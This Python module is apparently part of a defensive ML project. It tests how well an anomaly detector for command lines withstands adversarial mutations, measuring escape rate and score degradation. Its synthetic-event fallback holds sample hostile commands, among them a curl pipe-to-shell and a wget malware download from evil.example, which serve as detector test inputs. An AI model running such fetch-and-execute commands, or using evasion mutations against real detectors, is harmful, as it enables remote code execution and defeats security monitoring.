"""Robustness evaluation runner (issue #45).

Applies mutators to scenario events, scores original vs mutated, and generates
RobustnessCard with escape rate and degradation metrics. Mirrors the pattern
of scenario_replay.py but for adversarial evaluation rather than functional
detection.

Flow:
1. Load scenario expected_detections
2. Extract source events from scenario artifacts (stub for now)
3. Apply each mutator at light/medium/heavy
4. Score original vs mutated (stub for now - needs model integration)
5. Compute metrics (escape_rate, degradations)
"""

from __future__ import annotations

import json
import statistics
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

from synthaea_ml.data.canonical import ml_cmdline_from_record
from synthaea_ml.evaluation.mutations.base import Mutator
from synthaea_ml.evaluation.mutations.cmdline import ALL_T0_MUTATORS
from synthaea_ml.evaluation.mutations.prng import LCG
from synthaea_ml.evaluation.scenario_replay import _sha256_file, load_expected_detections
from synthaea_ml.features.cmdline import extract_features
from synthaea_ml.registry.training_record import MutationTestResult, RobustnessCard

_HASH_CHUNK = 1 << 16  # 64 KiB, matches scenario_replay.py


def _score_cmdline(model: Any, cmdline: str, threshold: float) -> float:
    """Score one command line using the model.

    Args:
        model: Trained model (sklearn IsolationForest with decision_function).
        cmdline: Command-line string (NUL-separated tokens).
        threshold: Model threshold for detection.

    Returns:
        Anomaly score (IsolationForest: negative = more anomalous, positive = benign).
    """
    features = extract_features(cmdline)
    # IsolationForest.decision_function returns negative for anomalies
    score = model.decision_function([features])[0]
    return float(score)


def _select_mutators_for_tier(tier: str) -> list[Mutator]:
    """Select mutators appropriate for the tier.

    Args:
        tier: One of "T0", "T1", "T2".

    Returns:
        List of mutator instances.

    Raises:
        ValueError: If tier is invalid.
    """
    if tier == "T0":
        return ALL_T0_MUTATORS
    if tier == "T1":
        raise NotImplementedError("T1 mutators not yet implemented")
    if tier == "T2":
        raise NotImplementedError("T2 mutators not yet implemented")
    raise ValueError(f"invalid tier: {tier}")


def run_robustness_evaluation(
    model: Any,
    scenario_yaml: Path,
    tier: str = "T0",
    mutation_seed: int = 42,
    threshold: float | None = None,
    events_source: Path | None = None,
) -> RobustnessCard:
    """Run adversarial evaluation on one scenario.

    Args:
        model: Trained model (sklearn IsolationForest with decision_function).
        scenario_yaml: Path to scenario yaml (e.g., lab/scenarios/beacon.yaml).
        tier: Mutation tier ("T0", "T1", "T2"). Default "T0".
        mutation_seed: Seed for deterministic PRNG. Default 42.
        threshold: Model threshold for detection. If None, uses model's default.
        events_source: Optional path to events.jsonl or baseline.jsonl file.
            If provided, loads real events from this file. If None, uses
            synthetic events based on expected_detections techniques.

    Returns:
        RobustnessCard with mutation results and aggregate metrics.

    Raises:
        FileNotFoundError: If scenario yaml or events_source is missing.
        ValueError: If tier is invalid or scenario has no detections.

    Notes:
        Prefers real events from events_source if provided. Falls back to
        synthetic events if events_source is None (for testing without captures).
    """
    scenario_name, expected = load_expected_detections(scenario_yaml)
    mutators = _select_mutators_for_tier(tier)

    if not expected:
        raise ValueError(f"scenario {scenario_name!r} has no expected_detections")

    # Determine threshold
    if threshold is None:
        # For IsolationForest, threshold is typically 0 (negative = anomaly)
        threshold = 0.0

    rng = LCG(seed=mutation_seed)
    results: list[MutationTestResult] = []

    # Load events from source or generate synthetic malicious events
    # IMPORTANT: events_source should contain MALICIOUS events matching the
    # scenario's expected_detections, NOT benign baseline events. Escape rate
    # is only meaningful when computed on originally-detected samples.
    if events_source and events_source.exists():
        source_events = _load_events_from_source(events_source)
        # Use all loaded events (no arbitrary limit)
        events_to_test = source_events if source_events else []

        if not events_to_test:
            # No events loaded, fall back to synthetic
            events_to_test = [
                _create_synthetic_event_for_detection(d.technique) for d in expected
            ]
    else:
        # Generate synthetic malicious events for each expected detection
        # This is the default path - synthetic events are guaranteed to be
        # anomalous (score < threshold), making escape_rate meaningful
        events_to_test = [
            _create_synthetic_event_for_detection(d.technique) for d in expected
        ]

    # Run mutations on each event
    for event in events_to_test:
        cmdline = ml_cmdline_from_record(event)
        original_score = _score_cmdline(model, cmdline, threshold)

        for mutator in mutators:
            for intensity in ["light", "medium", "heavy"]:
                try:
                    mutated_record = mutator.mutate(event, intensity, rng)
                    mutated_cmdline = ml_cmdline_from_record(mutated_record)
                    mutated_score = _score_cmdline(model, mutated_cmdline, threshold)

                    score_delta = mutated_score - original_score
                    escaped = mutated_score > threshold and original_score <= threshold

                    results.append(
                        MutationTestResult(
                            mutation_class=mutator.mutation_class_name(),
                            intensity=intensity,
                            original_score=original_score,
                            mutated_score=mutated_score,
                            score_delta=score_delta,
                            threshold=threshold,
                            escaped=escaped,
                            seed=rng.state,
                        )
                    )
                except ValueError:
                    # Skip mutations that fail (e.g., empty argv, invalid record)
                    continue

    if not results:
        raise ValueError(f"no mutation results for scenario {scenario_name!r}")

    # Compute aggregate metrics
    # CRITICAL: escape_rate is only meaningful on originally-detected samples
    # (original_score <= threshold). Filter to those before computing.
    originally_detected = [r for r in results if r.original_score <= threshold]

    if not originally_detected:
        # No originally-detected samples means escape_rate is undefined
        # This can happen if events_source contains only benign events
        raise ValueError(
            f"no originally-detected samples for scenario {scenario_name!r} "
            f"(all {len(results)} samples had original_score > {threshold}). "
            f"Are you using malicious events, not benign baseline?"
        )

    escape_rate = sum(r.escaped for r in originally_detected) / len(originally_detected)

    # Score degradations: positive delta means mutation moved toward benign (worse)
    # Compute on all results, not just originally-detected
    score_deltas = [r.score_delta for r in results]
    median_degradation = statistics.median(score_deltas)
    # FIXED: worst case is MAX (most degradation toward benign), not MIN
    worst_case_degradation = max(score_deltas)

    return RobustnessCard(
        scenario_name=scenario_name,
        scenario_yaml_sha256=_sha256_file(scenario_yaml),
        tested_at=datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ"),
        mutation_results=results,
        escape_rate=escape_rate,
        median_score_degradation=median_degradation,
        worst_case_degradation=worst_case_degradation,
    )


def _load_events_from_source(events_source: Path) -> list[dict[str, Any]]:
    """Load exec events from events.jsonl or baseline.jsonl file.

    Args:
        events_source: Path to JSONL file containing events.

    Returns:
        List of event records with cmdline/argv fields.

    Raises:
        FileNotFoundError: If events_source does not exist.
    """
    if not events_source.exists():
        raise FileNotFoundError(f"events_source not found: {events_source}")

    events: list[dict[str, Any]] = []
    for line in events_source.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            record = json.loads(line)
        except json.JSONDecodeError:
            continue

        # Extract exec events (type=="exec") or baseline records (have argv/cmdline)
        is_exec = record.get("type") == "exec"
        has_cmdline = "argv" in record or "cmdline" in record

        if is_exec or has_cmdline:
            # Normalize to baseline format (argv/cmdline at top level)
            if "argv" in record:
                events.append({"argv": record["argv"], "cmdline": record.get("cmdline")})
            elif "cmdline" in record and record.get("cmdline", "").strip() != "":
                # Windows: cmdline without argv
                events.append({"cmdline": record["cmdline"]})

    return events


def _create_synthetic_event_for_detection(technique: str) -> dict[str, Any]:
    """Create synthetic event for a detection technique.

    Fallback when no events_source is provided. Maps ATT&CK technique to
    plausible malicious command line.

    Args:
        technique: ATT&CK technique(s) like "T1071" or "T1059/T1071".

    Returns:
        Synthetic event record with argv field.
    """
    # Map technique to plausible malicious command line
    if "T1071" in technique:  # Command and Control
        return {"argv": ["curl", "-fsSL", "https://evil.example/payload", "|", "sh"]}
    if "T1059" in technique:  # Command and Scripting Interpreter
        return {"argv": ["bash", "-c", "echo aGVsbG8= | base64 -d"]}
    if "T1105" in technique:  # Ingress Tool Transfer
        return {"argv": ["wget", "-O", "/tmp/malware", "https://evil.example/tool"]}

    # Default: generic suspicious command
    return {"argv": ["bash", "-c", "base64 -d"]}
